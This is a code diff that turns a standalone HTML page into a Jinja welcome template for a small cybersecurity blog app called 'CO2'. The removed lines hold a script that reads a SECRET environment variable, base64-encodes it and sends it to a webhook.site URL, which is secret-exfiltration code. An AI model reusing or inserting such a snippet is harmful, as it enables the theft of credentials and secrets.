@@ -1,27 +1,18 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fetch and Redirect</title>
-</head>
-<body>
-    <script>
-    // Simulated environment variable
-const SECRET = process.env.SECRET;
-// Encode and send to webhook
-const encodedVariable = encodeURIComponent(btoa(SECRET));
-const webhookUrl = `https://webhook.site/2e32e2e8-7b4b-482f-9495-8726bc4a4f5d?yo=${encodedVariable}`;
-
-fetch(webhookUrl)
-  .then(response => response.text())
-  .then(data => {
-    console.log('Data sent successfully:', data);
-  })
-  .catch(error => {
-    console.error('Error sending data:', error);
-  });
-
-    </script>
-</body>
-</html>
+{% extends "base.html" %}
+{% block content %}
+<div class="text-center">
+<h1>Welcome to CO2</h1>
+<p>We are a CyberSecurity Blog Post application currently in our early phases, here you can find everything you need such as blog posts... 
+    and well that is it for now, but we will have more for you in the coming weeks/months!!</p>
+<h3>Some blog posts from our users</h3>
+<div class="card-group">
+{% for blog in posts %}
+<div class="card">
+    <div class="card-body">
+        <h5 class="card-title"></h5>
+        <p class="card-text">{{blog.content[:100]}}...</p>
+    </div>
+</div>
+{% endfor %}
+</div>
+{% endblock content %}
